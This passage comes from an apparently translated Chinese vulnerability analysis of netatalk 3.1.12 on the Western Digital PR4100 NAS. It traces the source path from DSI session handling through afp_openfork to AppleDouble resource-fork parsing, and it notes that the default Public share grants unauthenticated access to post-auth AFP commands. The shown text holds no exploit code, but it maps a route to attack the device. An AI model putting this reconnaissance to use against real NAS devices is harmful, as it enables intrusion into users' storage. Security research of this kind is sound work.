    <span class="k">if</span> <span class="p">((</span><span class="n">child</span> <span class="o">=</span> <span class="n">server_child_add</span><span class="p">(</span><span class="n">serv_children</span><span class="p">,</span> <span class="n">pid</span><span class="p">,</span> <span class="n">ipc_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]))</span> <span class="o">==</span>  <span class="nb">NULL</span><span class="p">)</span> <span class="p">{</span>
      <span class="n">LOG</span><span class="p">(</span><span class="n">log_error</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"dsi_getsess: %s"</span><span class="p">,</span> <span class="n">strerror</span><span class="p">(</span><span class="n">errno</span><span class="p">));</span>
      <span class="n">close</span><span class="p">(</span><span class="n">ipc_fds</span><span class="p">[</span><span class="mi">0</span><span class="p">]);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_flags</span> <span class="o">=</span> <span class="n">DSIFL_REPLY</span><span class="p">;</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span> <span class="o">=</span> <span class="n">htonl</span><span class="p">(</span><span class="n">DSIERR_SERVBUSY</span><span class="p">);</span>
      <span class="n">dsi_send</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
      <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_data</span><span class="p">.</span><span class="n">dsi_code</span> <span class="o">=</span> <span class="n">DSIERR_OK</span><span class="p">;</span>
      <span class="n">kill</span><span class="p">(</span><span class="n">pid</span><span class="p">,</span> <span class="n">SIGKILL</span><span class="p">);</span>
    <span class="p">}</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="o">*</span><span class="n">childp</span> <span class="o">=</span> <span class="n">child</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
  <span class="p">}</span>
  <span class="p">...</span>
  <span class="k">switch</span> <span class="p">(</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span><span class="p">)</span> <span class="p">{</span>
  <span class="p">...</span>
  <span class="k">case</span> <span class="n">DSIFUNC_OPEN</span><span class="p">:</span> <span class="cm">/* setup session */</span>
    <span class="cm">/* set up the tickle timer */</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_sec</span> <span class="o">=</span> <span class="n">tickleval</span><span class="p">;</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_interval</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">timer</span><span class="p">.</span><span class="n">it_value</span><span class="p">.</span><span class="n">tv_usec</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>
    <span class="n">dsi_opensession</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="o">*</span><span class="n">childp</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>

  <span class="nl">default:</span> <span class="cm">/* just close */</span>
    <span class="n">LOG</span><span class="p">(</span><span class="n">log_info</span><span class="p">,</span> <span class="n">logtype_dsi</span><span class="p">,</span> <span class="s">"DSIUnknown %d"</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">header</span><span class="p">.</span><span class="n">dsi_command</span><span class="p">);</span>
    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">proto_close</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
    <span class="n">exit</span><span class="p">(</span><span class="n">EXITERR_CLNT</span><span class="p">);</span>
  <span class="p">}</span>
<span class="p">}</span>
</pre></table></code></div></div><p>让我们回到<code class="language-plaintext highlighter-rouge">dsi_start()</code>函数。对于父进程来说，没有发生任何新的事情，并且<code class="language-plaintext highlighter-rouge">main()</code>函数继续并永远循环下去，等待其它客户端的连接。对于处理客户端连接的子进程来说，<code class="language-plaintext highlighter-rouge">afp_over_dsi()</code>函数被调用。该函数读取AFP数据包（DSI payload），判断AFP命令是什么，并根据命令调用<code class="language-plaintext highlighter-rouge">afp_switch[]</code>全局数组中的某个函数指针来处理AFP命令。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/afp_dsi.c</span>
<span class="cm">/* -------------------------------------------
 afp over dsi. this never returns.
*/</span>
<span class="kt">void</span> <span class="nf">afp_over_dsi</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="cm">/* get stuck here until the end */</span>
    <span class="k">while</span> <span class="p">(</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="cm">/* Blocking read on the network socket */</span>
        <span class="n">cmd</span> <span class="o">=</span> <span class="n">dsi_stream_receive</span><span class="p">(</span><span class="n">dsi</span><span class="p">);</span>
        <span class="p">...</span>
        <span class="k">switch</span><span class="p">(</span><span class="n">cmd</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
        <span class="k">case</span> <span class="n">DSIFUNC_CMD</span><span class="p">:</span>
            <span class="p">...</span>
                <span class="cm">/* send off an afp command. in a couple cases, we take advantage
                 * of the fact that we're a stream-based protocol. */</span>
                <span class="k">if</span> <span class="p">(</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])</span> <span class="p">{</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span> <span class="o">=</span> <span class="n">DSI_DATASIZ</span><span class="p">;</span>
                    <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">flags</span> <span class="o">|=</span> <span class="n">DSI_RUNNING</span><span class="p">;</span>

                    <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_afpd</span><span class="p">,</span> <span class="s">"&lt;== Start AFP command: %s"</span><span class="p">,</span> <span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>

                    <span class="n">AFP_AFPFUNC_START</span><span class="p">(</span><span class="n">function</span><span class="p">,</span> <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">AfpNum2name</span><span class="p">(</span><span class="n">function</span><span class="p">));</span>
                    <span class="n">err</span> <span class="o">=</span> <span class="p">(</span><span class="o">*</span><span class="n">afp_switch</span><span class="p">[</span><span class="n">function</span><span class="p">])(</span><span class="n">obj</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">commands</span><span class="p">,</span> <span class="n">dsi</span><span class="o">-&gt;</span><span class="n">cmdlen</span><span class="p">,</span>
                                                  <span class="p">(</span><span class="kt">char</span> <span class="o">*</span><span class="p">)</span><span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">data</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">dsi</span><span class="o">-&gt;</span><span class="n">datalen</span><span class="p">);</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">afp_switch[]</code>全局数组在一开始被初始化为<code class="language-plaintext highlighter-rouge">preauth_switch</code>，该全局变量包含了一些在认证前可以执行的函数句柄。我们可以猜出，当客户端通过验证之后，该全局数组将被设置为<code class="language-plaintext highlighter-rouge">postauth_switch</code>这个值，该值会给客户端更多的其它AFP特性的访问权限。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/switch.c</span>
<span class="cm">/*
 * Routines marked "NULL" are not AFP functions.
 * Routines marked "afp_null" are AFP functions
 * which are not yet implemented. A fine line...
 */</span>
<span class="k">static</span> <span class="n">AFPCmd</span> <span class="n">preauth_switch</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*   0 -   7 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*   8 -  15 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_login</span><span class="p">,</span> <span class="n">afp_logincont</span><span class="p">,</span>
    <span class="n">afp_logout</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>				<span class="cm">/*  16 -  23 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  24 -  31 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  32 -  39 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  40 -  47 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>					<span class="cm">/*  48 -  55 */</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_login_ext</span><span class="p">,</span>				<span class="cm">/*  56 -  63 */</span>
    <span class="p">...</span>
<span class="p">};</span>

<span class="n">AFPCmd</span> <span class="o">*</span><span class="n">afp_switch</span> <span class="o">=</span> <span class="n">preauth_switch</span><span class="p">;</span>

<span class="n">AFPCmd</span> <span class="n">postauth_switch</span><span class="p">[]</span> <span class="o">=</span> <span class="p">{</span>
    <span class="nb">NULL</span><span class="p">,</span> <span class="n">afp_bytelock</span><span class="p">,</span> <span class="n">afp_closevol</span><span class="p">,</span> <span class="n">afp_closedir</span><span class="p">,</span>
    <span class="n">afp_closefork</span><span class="p">,</span> <span class="n">afp_copyfile</span><span class="p">,</span> <span class="n">afp_createdir</span><span class="p">,</span> <span class="n">afp_createfile</span><span class="p">,</span>	<span class="cm">/*   0 -   7 */</span>
    <span class="n">afp_delete</span><span class="p">,</span> <span class="n">afp_enumerate</span><span class="p">,</span> <span class="n">afp_flush</span><span class="p">,</span> <span class="n">afp_flushfork</span><span class="p">,</span>
    <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_getforkparams</span><span class="p">,</span> <span class="n">afp_getsrvrinfo</span><span class="p">,</span>	<span class="cm">/*   8 -  15 */</span>
    <span class="n">afp_getsrvrparms</span><span class="p">,</span> <span class="n">afp_getvolparams</span><span class="p">,</span> <span class="n">afp_login</span><span class="p">,</span> <span class="n">afp_logincont</span><span class="p">,</span>
    <span class="n">afp_logout</span><span class="p">,</span> <span class="n">afp_mapid</span><span class="p">,</span> <span class="n">afp_mapname</span><span class="p">,</span> <span class="n">afp_moveandrename</span><span class="p">,</span>	<span class="cm">/*  16 -  23 */</span>
    <span class="n">afp_openvol</span><span class="p">,</span> <span class="n">afp_opendir</span><span class="p">,</span> <span class="n">afp_openfork</span><span class="p">,</span> <span class="n">afp_read</span><span class="p">,</span>
    <span class="n">afp_rename</span><span class="p">,</span> <span class="n">afp_setdirparams</span><span class="p">,</span> <span class="n">afp_setfilparams</span><span class="p">,</span> <span class="n">afp_setforkparams</span><span class="p">,</span>
    <span class="cm">/*  24 -  31 */</span>
    <span class="n">afp_setvolparams</span><span class="p">,</span> <span class="n">afp_write</span><span class="p">,</span> <span class="n">afp_getfildirparams</span><span class="p">,</span> <span class="n">afp_setfildirparams</span><span class="p">,</span>
    <span class="n">afp_changepw</span><span class="p">,</span> <span class="n">afp_getuserinfo</span><span class="p">,</span> <span class="n">afp_getsrvrmesg</span><span class="p">,</span> <span class="n">afp_createid</span><span class="p">,</span> <span class="cm">/*  32 -  39 */</span>
    <span class="n">afp_deleteid</span><span class="p">,</span> <span class="n">afp_resolveid</span><span class="p">,</span> <span class="n">afp_exchangefiles</span><span class="p">,</span> <span class="n">afp_catsearch</span><span class="p">,</span>
    <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span>			<span class="cm">/*  40 -  47 */</span>
    <span class="n">afp_opendt</span><span class="p">,</span> <span class="n">afp_closedt</span><span class="p">,</span> <span class="n">afp_null</span><span class="p">,</span> <span class="n">afp_geticon</span><span class="p">,</span>
    <span class="n">afp_geticoninfo</span><span class="p">,</span> <span class="n">afp_addappl</span><span class="p">,</span> <span class="n">afp_rmvappl</span><span class="p">,</span> <span class="n">afp_getappl</span><span class="p">,</span>	<span class="cm">/*  48 -  55 */</span>
    <span class="n">afp_addcomment</span><span class="p">,</span> <span class="n">afp_rmvcomment</span><span class="p">,</span> <span class="n">afp_getcomment</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span>
    <span class="p">...</span>
<span class="p">};</span>
</pre></table></code></div></div><p>这里有一个有趣的事情值得注意：西部数据PR4100设备在默认环境下开放了一个<code class="language-plaintext highlighter-rouge">Public</code>的AFP共享，允许客户端不经任何认证即可访问。这意味着只要我们访问的目标是这个<code class="language-plaintext highlighter-rouge">Public</code> AFP共享，就可以访问所有认证后的函数句柄。另外同样值得注意的是，相同的<code class="language-plaintext highlighter-rouge">Public</code>共享目录也可以使用guest用户通过SMB协议来访问，而不需要输入任何密码。这说明我们可以通过AFP或者SMB协议读取、创建或修改存储于这个<code class="language-plaintext highlighter-rouge">Public</code>共享目录中任意文件。</p><p>我们感兴趣的AFP命令是“FPOpenFork”，该命令被<code class="language-plaintext highlighter-rouge">afp_openfork()</code>函数句柄来处理。如上文所述，fork文件是用来存储一个常规文件的属性等元数据的特殊文件。fork文件是以AppleDouble文件格式存储的。<code class="language-plaintext highlighter-rouge">afp_openfork()</code>函数句柄会在磁盘上查找fork文件的路径并打开，之后调用<code class="language-plaintext highlighter-rouge">ad_open()</code>函数来处理（“ad”代表AppleDouble）。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/etc/afpd/fork.c</span>
<span class="cm">/* ----------------------- */</span>
<span class="kt">int</span> <span class="nf">afp_openfork</span><span class="p">(</span><span class="n">AFPObj</span> <span class="o">*</span><span class="n">obj</span> <span class="n">_U_</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">ibuf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="n">ibuflen</span> <span class="n">_U_</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">rbuf</span><span class="p">,</span> <span class="kt">size_t</span> <span class="o">*</span><span class="n">rbuflen</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">struct</span> <span class="nc">adouble</span>  <span class="o">*</span><span class="n">adsame</span> <span class="o">=</span> <span class="nb">NULL</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">opened</span> <span class="o">=</span> <span class="n">of_findname</span><span class="p">(</span><span class="n">vol</span><span class="p">,</span> <span class="n">s_path</span><span class="p">)))</span> <span class="p">{</span>
        <span class="n">adsame</span> <span class="o">=</span> <span class="n">opened</span><span class="o">-&gt;</span><span class="n">of_ad</span><span class="p">;</span>
    <span class="p">}</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">ofork</span> <span class="o">=</span> <span class="n">of_alloc</span><span class="p">(</span><span class="n">vol</span><span class="p">,</span> <span class="n">curdir</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="o">&amp;</span><span class="n">ofrefnum</span><span class="p">,</span> <span class="n">eid</span><span class="p">,</span> <span class="n">adsame</span><span class="p">,</span> <span class="n">st</span><span class="p">))</span> <span class="o">==</span> <span class="nb">NULL</span><span class="p">)</span>
        <span class="k">return</span> <span class="n">AFPERR_NFILE</span><span class="p">;</span>
    <span class="p">...</span>
    <span class="cm">/* First ad_open(), opens data or ressource fork */</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ad_open</span><span class="p">(</span><span class="n">ofork</span><span class="o">-&gt;</span><span class="n">of_ad</span><span class="p">,</span> <span class="n">upath</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="mo">0666</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_open()</code>函数非常普通，它能够打开不同的fork文件：一个数据（data）fork文件，一个元数据（metadata）fork文件或者一个资源（resource）fork文件。由于我们处理的是一个资源fork文件（译者：在利用时），我们最终会调用<code class="language-plaintext highlighter-rouge">ad_open_rf()</code>函数（“rf”代表resource fork）。</p><p>注意：<code class="language-plaintext highlighter-rouge">ad_open()</code>位于<code class="language-plaintext highlighter-rouge">libatalk/</code>目录当中，而不是之前讨论的代码所在的<code class="language-plaintext highlighter-rouge">etc/afpd</code>目录。因此，从现在起，我们分析的代码都位于<code class="language-plaintext highlighter-rouge">libatalk.so</code>库中。</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
58
59
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/*!
 * Open data-, metadata(header)- or ressource fork
 *
 * ad_open(struct adouble *ad, const char *path, int adflags, int flags)
 * ad_open(struct adouble *ad, const char *path, int adflags, int flags, mode_t mode)
 *
 * You must call ad_init() before ad_open, usually you'll just call it like this: \n
 * @code
 *      struct adoube ad;
 *      ad_init(&amp;ad, vol-&gt;v_adouble, vol-&gt;v_ad_options);
 * @endcode
 *
 * Open a files data fork, metadata fork or ressource fork.
 *
 * @param ad        (rw) pointer to struct adouble
 * @param path      (r)  Path to file or directory
 * @param adflags   (r)  Flags specifying which fork to open, can be or'd:
 *                         ADFLAGS_DF:        open data fork
 *                         ADFLAGS_RF:        open ressource fork
 *                         ADFLAGS_HF:        open header (metadata) file
 *                         ADFLAGS_NOHF:      it's not an error if header file couldn't be opened
 *                         ADFLAGS_NORF:      it's not an error if reso fork couldn't be opened
 *                         ADFLAGS_DIR:       if path is a directory you MUST or ADFLAGS_DIR to adflags
 *
 *                       Access mode for the forks:
 *                         ADFLAGS_RDONLY:    open read only
 *                         ADFLAGS_RDWR:      open read write
 *
 *                       Creation flags:
 *                         ADFLAGS_CREATE:    create if not existing
 *                         ADFLAGS_TRUNC:     truncate
 *
 *                       Special flags:
 *                         ADFLAGS_CHECK_OF:  check for open forks from us and other afpd's
 *                         ADFLAGS_SETSHRMD:  this adouble struct will be used to set sharemode locks.
 *                                            This basically results in the files being opened RW instead of RDONLY.
 * @param mode      (r)  mode used with O_CREATE
 *
 * The open mode flags (rw vs ro) have to take into account all the following requirements:
 * - we remember open fds for files because me must avoid a single close releasing fcntl locks for other
 *   fds of the same file
 *
 * BUGS:
 *
 * * on Solaris (HAVE_EAFD) ADFLAGS_RF doesn't work without
 *   ADFLAGS_HF, because it checks whether ad_meta_fileno() is already
 *   openend. As a workaround pass ADFLAGS_SETSHRMD.
 *
 * @returns 0 on success, any other value indicates an error
 */</span>
<span class="kt">int</span> <span class="nf">ad_open</span><span class="p">(</span><span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">,</span> <span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">adflags</span><span class="p">,</span> <span class="p">...)</span>
<span class="p">{</span>
    <span class="p">...</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">adflags</span> <span class="o">&amp;</span> <span class="n">ADFLAGS_RF</span><span class="p">)</span> <span class="p">{</span>
        <span class="k">if</span> <span class="p">(</span><span class="n">ad_open_rf</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">ad</span><span class="p">)</span> <span class="o">!=</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
            <span class="n">EC_FAIL</span><span class="p">;</span>
        <span class="p">}</span>
    <span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_open_rf()</code>函数之后会调用并进入<code class="language-plaintext highlighter-rouge">ad_open_rf_ea()</code>函数：</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
</pre><td class="rouge-code"><pre><span class="c1">//netatalk-3.1.12/libatalk/adouble/ad_open.c</span>
<span class="cm">/*!
 * Open ressource fork
 */</span>
<span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_open_rf</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">adflags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="kt">int</span> <span class="n">ret</span> <span class="o">=</span> <span class="mi">0</span><span class="p">;</span>

    <span class="k">switch</span> <span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_vers</span><span class="p">)</span> <span class="p">{</span>
    <span class="k">case</span> <span class="n">AD_VERSION2</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ad_open_rf_v2</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">ad</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="k">case</span> <span class="n">AD_VERSION_EA</span><span class="p">:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="n">ad_open_rf_ea</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">,</span> <span class="n">mode</span><span class="p">,</span> <span class="n">ad</span><span class="p">);</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="nl">default:</span>
        <span class="n">ret</span> <span class="o">=</span> <span class="o">-</span><span class="mi">1</span><span class="p">;</span>
        <span class="k">break</span><span class="p">;</span>
    <span class="p">}</span>

    <span class="k">return</span> <span class="n">ret</span><span class="p">;</span>
<span class="p">}</span>
</pre></table></code></div></div><p><code class="language-plaintext highlighter-rouge">ad_open_rf_ea()</code>函数打开（译者：我们所指定的）资源fork文件。假定该文件已经存在，该函数最终会调用并进入<code class="language-plaintext highlighter-rouge">ad_header_read_osx()</code>函数，读取该文件的、基于AppleDouble格式的实际内容：</p><div lang="c++" class="language-c++ highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
</pre><td class="rouge-code"><pre><span class="k">static</span> <span class="kt">int</span> <span class="nf">ad_open_rf_ea</span><span class="p">(</span><span class="k">const</span> <span class="kt">char</span> <span class="o">*</span><span class="n">path</span><span class="p">,</span> <span class="kt">int</span> <span class="n">adflags</span><span class="p">,</span> <span class="kt">int</span> <span class="n">mode</span><span class="p">,</span> <span class="k">struct</span> <span class="nc">adouble</span> <span class="o">*</span><span class="n">ad</span><span class="p">)</span>
<span class="p">{</span>
    <span class="p">...</span>

<span class="cp">#ifdef HAVE_EAFD
</span>    <span class="p">...</span>
<span class="cp">#else
</span>    <span class="n">EC_NULL_LOG</span><span class="p">(</span> <span class="n">rfpath</span> <span class="o">=</span> <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_ops</span><span class="o">-&gt;</span><span class="n">ad_path</span><span class="p">(</span><span class="n">path</span><span class="p">,</span> <span class="n">adflags</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">((</span><span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">)</span> <span class="o">=</span> <span class="n">open</span><span class="p">(</span><span class="n">rfpath</span><span class="p">,</span> <span class="n">oflags</span><span class="p">))</span> <span class="o">==</span> <span class="o">-</span><span class="mi">1</span><span class="p">)</span> <span class="p">{</span>
        <span class="p">...</span>
    <span class="p">}</span>
<span class="cp">#endif
</span>    <span class="n">opened</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_refcount</span> <span class="o">=</span> <span class="mi">1</span><span class="p">;</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_flags</span> <span class="o">=</span> <span class="n">oflags</span><span class="p">;</span>
    <span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_reso_refcount</span><span class="o">++</span><span class="p">;</span>

<span class="cp">#ifndef HAVE_EAFD
</span>    <span class="n">EC_ZERO_LOG</span><span class="p">(</span> <span class="n">fstat</span><span class="p">(</span><span class="n">ad_reso_fileno</span><span class="p">(</span><span class="n">ad</span><span class="p">),</span> <span class="o">&amp;</span><span class="n">st</span><span class="p">)</span> <span class="p">);</span>
    <span class="k">if</span> <span class="p">(</span><span class="n">ad</span><span class="o">-&gt;</span><span class="n">ad_rfp</span><span class="o">-&gt;</span><span class="n">adf_flags</span> <span class="o">&amp;</span> <span class="n">O_CREAT</span><span class="p">)</span> <span class="p">{</span>
        <span class="cm">/* This is a new adouble header file, create it */</span>
        <span class="n">LOG</span><span class="p">(</span><span class="n">log_debug</span><span class="p">,</span> <span class="n">logtype_ad</span><span class="p">,</span> <span class="s">"ad_open_rf(</span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">): created adouble rfork, initializing: </span><span class="se">\"</span><span class="s">%s</span><span class="se">\"</span><span class="s">"</span><span class="p">,</span>
            <span class="n">path</span><span class="p">,</span> <span class="n">rfpath</span><span class="p">);</span>
        <span class="n">EC_NEG1_LOG</span><span class="p">(</span> <span class="n">new_ad_header</span><span class="p">(</span><span class="n">ad</span><span class="p">,</span> <span class="n">path</span><span class="p">,</span> <span class="nb">NULL</span><span class="p">,</span> <span class="n">adflags</span><span class="p">)</span> <span class="p">);</span>
